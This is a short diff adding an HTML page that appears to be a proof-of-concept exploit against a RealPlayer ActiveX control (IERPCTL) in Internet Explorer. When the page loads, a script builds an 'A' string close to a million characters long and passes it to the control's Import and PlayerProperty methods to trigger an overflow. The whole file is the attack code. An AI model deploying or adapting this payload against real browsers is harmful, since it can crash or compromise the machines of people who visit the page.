@@ -1,0 +1,28 @@
+<!--
+written by e.b.
+-->
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+    function Check() {
+    var s = "AAAA";
+
+    while (s.length < 999999) s=s+s;
+
+     var obj = new ActiveXObject("IERPCTL.IERPCTL"); //{FDC7A535-4070-4B92-A0EA-D9994BCC0DC5}
+
+
+      obj.Import(s);
+      obj.PlayerProperty(s);
+
+
+   }
+  </script>
+
+ </head>
+ <body onload="JavaScript: return Check();">
+
+ </body>
+</html>
+
+
